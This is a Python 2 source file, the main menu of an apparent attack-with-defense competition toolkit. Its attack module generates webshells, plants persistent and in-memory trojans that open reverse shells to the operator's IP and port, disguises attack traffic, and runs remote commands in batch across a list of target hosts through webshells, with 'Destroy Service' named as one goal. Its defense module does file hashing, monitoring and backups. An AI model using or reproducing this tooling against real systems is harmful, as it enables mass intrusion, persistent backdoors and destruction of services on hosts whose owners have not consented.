# -*- coding:utf-8 -*-
from files import *
from request import *
from shell import *
from upload import *
from attack import *
from protect import *

def config():
	ip_list = []
	print "[+]Attack Config."
	print "[+]Target Address Select."
	ip_num = raw_input('How Num:')
	for i in range(int(ip_num)):
		ip = raw_input('Target:')
		ip_list.append(ip)
	for i in range(len(ip_list)):
		write_txt('target.txt',ip_list[i])
	print "[+]Target Address Select Succeed."
	
def start():
	while 1:
		print "*******************************************************"
		print "****************A*****W**W**W**DDD*********************"
		print "***************A*A****W**W**W**D**D********************"
		print "**************AAAAA****W*W*W***D**D********************"
		print "*************A*****A****W*W****DDD*********************"
		print "***********************************By:ZacharyZcR*******"
		print "***********************************Version:0.1.7*******"
		print "***********************************Copyright:Acmesec***"
		print "*******************************************************"
		print "[+]Function list:"
		print "1.Help"
		print "2.Help_CN"
		print "3.Attack_Module"
		print "4.Defense_Module"
		func = raw_input('Num:')
		if func == '1':
			print '''This is an AWD tool platform integrating attack and defense.
With simple configuration, you can start to use various functions.
Function list:
files:
	read_array(target_file)
	read_var(target_file)
	write_txt(target_file,content)
	dir_tree(startpath)
	get_php_list(startpath)
shell:
	shell_gen()
	rce(address,password,method)
upload:
	trojan_implant(address,webshell,trojan,password)
	trojan_implant_memory(address,webshell,trojan,ip,port,password)
	file_implant(address,webshell,name,data,password)
	check(address)
attack:
	confuse(ip = [],php_list = [])
protect:
	get_file_md5(filename)
	file_md5_build(startpath)
	file_md5_defense()
	file_md5_check()
	file_log_add()
	file_backup()
	file_backup_remove()'''
		if func == '2':
			print '''这是一个集成了攻击和防御的AWD工具平台。
通过简单的配置你就可以开始使用各项功能了。
功能列表:
files:
	read_array(target_file)
	read_var(target_file)
	write_txt(target_file,content)
	dir_tree(startpath)
	get_php_list(startpath)
shell:
	shell_gen()
	rce(address,password,method)
upload:
	trojan_implant(address,webshell,trojan,password)
	trojan_implant_memory(address,webshell,trojan,ip,port,password)
	file_implant(address,webshell,name,data,password)
	check(address)
attack:
	confuse(ip = [],php_list = [])
protect:
	get_file_md5(filename)
	file_md5_build(startpath)
	file_md5_defense()
	file_md5_check()
	file_log_add()
	file_backup()
	file_backup_remove()'''
		if func == '3':
			print "[+]Attack module loaded"
			print "1.Webshell Generate"
			print "2.Attack Config"
			print "3.Undead Trojan Implant"
			print "4.Memory Trojan Implant(Rebound Shell)"
			print "5.Attack Traffic Confusion"
			print "6.Single Remote Command Execution"
			print "7.Batch Remote Command Execution(Cat Flag/Destroy Service/End This AWD)"
			_choose = raw_input('Num:')
			if _choose == '1':
				shell_gen()
			if _choose == '2':
				config()
			if _choose == '3':
				webshell = raw_input('Input Target URL Without Host:')
				trojan = raw_input('Input Trojan Name:')
				passwd = raw_input('Input The Webshell Password:')
				target_list = []
				target_list = read_array('target.txt')
				for i in range(len(target_list)):
					trojan_implant(target_list[i],webshell,trojan,passwd)
			if _choose == '4':
				webshell = raw_input('Input Target Webshell URL Without Host:')
				trojan = raw_input('Input Trojan Name:')
				passwd = raw_input('Input The Webshell Password:')
				ip = raw_input('Input Your IP:')
				port = input('Input Your Port:')
				target_list = read_array('target.txt')
				for i in range(len(target_list)):
					trojan_implant_memory(target_list[i],webshell,trojan,ip,port,passwd)
					port += 1
			if _choose == '5':
				target_list = read_array('target.txt')
				file_list = get_php_list('./')
				try:
					for i in range(len(target_list)):
						confuse(target_list,file_list)
				except:
					print '[-]Error.'
			if _choose == '6':
				target_list = read_array('target.txt')
				try:
					for i in range(len(target_list)):
						print str(i)+' '+target_list[i]
					sign = input('Num:')
					webshell = raw_input('Input Target URL Without Host:')
					passwd = raw_input('Input The Webshell Password:')
					method = raw_input('Input Connect Method(1.Get 2.Post):')
					if method == '1':
						method = 'get'
					if method == '2':
						method = 'post'
					rce(target_list[sign]+webshell,passwd,method)
				except:
					print '[-]Error.'
			if _choose == '7':
				target_list = read_array('target.txt')
				webshell = raw_input('Input Target URL Without Host:')
				passwd = raw_input('Input The Webshell Password:')
				method = raw_input('Input Connect Method(1.Get 2.Post):')
				if method == '1':
					method = 'get'
				if method == '2':
					method = 'post'
				while 1:
					try:
						command = raw_input('Command(Input stop to exit):')
						if command == 'stop':
							break
						for i in range(len(target_list)):
							batch_rce(target_list[i]+webshell,passwd,method,command)
					except:
						print '[-]Error.'
		if func == '4':
			print "[+]Defense module loaded"
			print "1.Build dir tree."
			print "2.Start file protect module."
			print "3.Start file monitor module."
			print "4.File backup."
			print "5.File backup remove."
			print "6.PHP file add log."
			_choose = raw_input('Num:')
			if _choose == '1':
				dir_tree('./')
			if _choose == '2':
				file_md5_defense()
			if _choose == '3':
				file_md5_check()
			if _choose == '4':
				file_backup()
			if _choose == '5':
				file_backup_remove()
			if _choose == '6':
				file_log_add()